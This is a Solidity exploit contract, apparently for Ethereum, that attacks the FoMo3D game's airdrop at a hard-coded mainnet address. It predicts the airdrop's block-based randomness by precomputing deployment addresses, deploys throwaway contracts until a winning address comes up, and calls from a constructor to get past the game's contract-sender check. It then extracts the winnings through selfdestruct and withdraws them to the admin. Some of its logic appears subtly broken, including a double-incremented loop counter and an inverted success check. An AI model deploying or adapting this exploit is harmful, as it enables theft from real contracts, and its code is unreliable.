pragma solidity ^0.4.24;

interface FoMo3DlongInterface {
    function airDropTracker_() external returns (uint256);
    function airDropPot_() external returns (uint256);
    function withdraw() external;
}

/* 
 * Contract addresses are deterministic. 
 * We find out how many deployments it&#39;ll take to get a winning contract address
 * then deploy blank contracts until we get to the second last number of deployments to generate a successful address.
*/
contract BlankContract {
    constructor() public {}
}

//contract which will win the airdrop
contract AirDropWinner {
    //point to Fomo3d Contract
    FoMo3DlongInterface private fomo3d = FoMo3DlongInterface(0xA62142888ABa8370742bE823c1782D17A0389Da1);
    /*
     * 0.1 ether corresponds the amount to send to Fomo3D for a chance at winning the airDrop
     * This is sent within the constructor to bypass a modifier that checks for blank code from the message sender
     * As during construction a contract&#39;s code is blank.
     * We then withdraw all earnings from fomo3d and selfdestruct to returns all funds to the main exploit contract.
     */
    constructor() public {
        if(!address(fomo3d).call.value(0.1 ether)()) {
           fomo3d.withdraw();
           selfdestruct(msg.sender);
        }

    }
}

contract PonziPwn {
    FoMo3DlongInterface private fomo3d = FoMo3DlongInterface(0xA62142888ABa8370742bE823c1782D17A0389Da1);
    
    address private admin;
    uint256 private blankContractGasLimit = 20000;
    uint256 private pwnContractGasLimit = 250000;
       
    //gasPrice you&#39;ll use during the exploit
    uint256 private gasPrice = 10;
    uint256 private gasPriceInWei = gasPrice*1e9;
    
    //cost of deploying each contract
    uint256 private blankContractCost = blankContractGasLimit*gasPrice ;
    uint256 private pwnContractCost = pwnContractGasLimit*gasPrice;
    uint256 private maxAmount = 10 ether;
    
    modifier onlyAdmin() {
        require(msg.sender == admin);
        _;
    }

    constructor() public {
        admin = msg.sender;
    }

    function checkPwnData() private returns(uint256,uint256,address) {
        //The address that a contract deployed by this contract will have
        address _newSender = address(keccak256(abi.encodePacked(0xd6, 0x94, address(this), 0x01)));
        uint256 _nContracts = 0;
        uint256 _pwnCost = 0;
        uint256 _seed = 0;
        uint256 _tracker = fomo3d.airDropTracker_();
        bool _canWin = false;
        while(!_canWin) {
            /* 
	     * How the seed if calculated in fomo3d.
             * We input a new address each time until we get to a winning seed.
            */
            _seed = uint256(keccak256(abi.encodePacked(
                   (block.timestamp) +
                   (block.difficulty) +
                   ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)) +
                   (block.gaslimit) +
                   ((uint256(keccak256(abi.encodePacked(_newSender)))) / (now)) +
                   (block.number)
            )));

            //Tally number of contract deployments that&#39;ll result in a win. 
            //We tally the cost of deploying blank contracts.
            if((_seed - ((_seed / 1000) * 1000)) >= _tracker) {
                    _newSender = address(keccak256(abi.encodePacked(0xd6, 0x94, _newSender, 0x01)));
                    _nContracts++;
                    _pwnCost+= blankContractCost;
            } else {
                    _canWin = true;
                    //Add the cost of deploying a contract that will result in the winning of an airdrop
                    _pwnCost += pwnContractCost;
            }
        }
        return (_pwnCost,_nContracts,_newSender);
    }

    function deployContracts(uint256 _nContracts,address _newSender) private {
        /* 
	 * deploy blank contracts until the final index at which point we first send ETH to the pregenerated address then deploy
         * an airdrop winning contract which will have that address;
        */
        for(uint256 _i; _i < _nContracts; _i++) {
            if(_i++ == _nContracts) {
               address(_newSender).call.value(0.1 ether)();
               new AirDropWinner();
            }
            new BlankContract();
        }
    }

    //main method
    function beginPwn() public onlyAdmin() {
        uint256 _pwnCost;
        uint256 _nContracts;
        address _newSender;
        (_pwnCost, _nContracts,_newSender) = checkPwnData();
        
	//check that the cost of executing the attack will make it worth it
        if(_pwnCost + 0.1 ether < maxAmount) {
           deployContracts(_nContracts,_newSender);
        }
    }

    //allows withdrawal of funds after selfdestructing of a child contract which return funds to this contract
    function withdraw() public onlyAdmin() {
        admin.transfer(address(this).balance);
    }
}